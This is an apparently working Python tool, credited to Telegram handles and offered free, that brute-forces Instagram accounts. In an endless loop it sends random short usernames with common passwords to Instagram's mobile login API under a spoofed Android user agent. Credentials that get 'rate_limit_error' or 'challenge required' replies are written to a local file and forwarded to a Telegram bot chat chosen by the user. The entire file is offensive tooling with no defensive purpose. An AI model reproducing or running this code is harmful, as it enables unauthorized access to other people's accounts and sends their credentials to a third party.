#This Tool by @YSYSD|| @VNVN6
#channel  : t.me/VNVN6
 
#Not for sale is free 
#الاداة مجانيه وليست للبيع
 
 
#↑↑↑↑↑↑↑↑
#######################
 
# Dont Give Up - Dev Yso @YSYSD
# 


from csv import excel
import os 

import requests , random , time , sys
from uuid import uuid4
from time import sleep



# The Color 

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح


def j(z):
    for e in z:
     sys.stdout.write(e) 
     sys.stdout.flush() 
     time.sleep(260/10000)
sleep (0.5)


# The Baner Exec
 
sleep (0.5)
print("""
 
\033[2;35m     <   _______  _______ ____ 
\033[2;35m        | ____\ \/ / ____/ ___|
\033[2;35m        |  _|  \  /|  _|| |    
\033[2;35m        | |___ /  \| |__| |___ 
\033[2;35m        |_____/_/\_\_____\____|   >
\033[1;31m           < Dont Give Up +
\033[1;31m     This Tool Hinting Instagram
\033[1;31m                Warrior >
 
""")

# The ID + Token in Bot

j("""\033[2;36m
    - Hello Sir, We Need Token and ID To Send \n The Catch To The Bot ..""")
print('''  
       ''')
exec1 = input(' EnTer YoUr ID : ')
sleep(1.5)
exec2 = input(' EnTer YoUr ToKeN : ')
 
j("""\033[2;36m
    - ExEc StaRt HunTing :""")
print('''  
       ''')   



url = 'https://i.instagram.com/api/v1/accounts/login/'

sleep(1)
 
req = requests.Session()

headers = {
 
    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
 
    'Accept': "*/*",
 
    'Cookie': 'missing',
 
    'Accept-Encoding': 'gzip, deflate',
 
    'Accept-Language': 'en-US',
 
    'X-IG-Capabilities': '3brTvw==',
 
    'X-IG-Connection-Type': 'WIFI',
 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 
    'Host': 'i.instagram.com'
             
         }
num = '1q2w3e4r5t6y7u8i9o0plmknjbhvgcfxdzsa'

while True:
        us = str(''.join((random.choice(num) for i in range(4))))
        num1 = ('1122334455','12341234','1234512345','11223344','Aa123123', 'Aa123456','qwer1234', '1234qwer','20192019','20202020','20182018','20172017','20162016','20152015','19921992','19941994','19931993','19951995','19961996','19971997','19981998','19991999','20002000''87654321','333333','sexsex','12qwaszx','789456123','147258369','0987654321','123456789a','123123a','123456789q','123qweasd','password123','a1b2c3d4','666999','1234abcd','343343','123454321','q1w2e3r4t5y6')
        username = us
        password = random.choice(num1)

        uid = str(uuid4())              
        data = {
             'uuid':uid, 
 
             'password':password, 
             'username':username, 
 
             'device_id':uid, 
 
             'from_reg':'false', 
 
             '_csrftoken':'missing', 
 
             'login_attempt_countn':'0'}

        reqq = requests.post( url , headers=headers, data=data, allow_redirects=True)

        if "rate_limit_error" in reqq.text:
            print (Z+f"KID -13 B : {username}:{password}")


            die = (f"https://api.telegram.org/bot{exec2}/sendMessage?chat_id={exec1}&text=• 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 B -13 KID ♔︎ ➪: [ {username} ] \n • 𝐁 ⚚ ➪ : [ {password} ] \n • 𝐅𝐫𝐎𝐦 :  @EE_EEI") 
            x = requests.post(die)
            open("Warrior.txt","a").write(f" B -13 >> {username}:{password}\n")

        elif 'Bad Password' in reqq.text:
            print (Z1+f" KiD B -13 ! » {username}:{password}")


        elif 'challenge required' in reqq.text:
            print (X+f" Secure ! » {username}:{password}")


            die2 = (f"https://api.telegram.org/bot{exec2}/sendMessage?chat_id={exec1}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 CCD ♔︎ ➪: [ {username} ] \n • 𝐁 ⚚ ➪ : [ {password} ] \n • 𝐅𝐫𝐎𝐦 : @EE_EEI") 
            open("Warrior.txt","a").write(f" CCD >> {username}:{password}\n")
            x = requests.post(die2)


        else:
            print (Z+f" ERROR  »     {username}:{password}")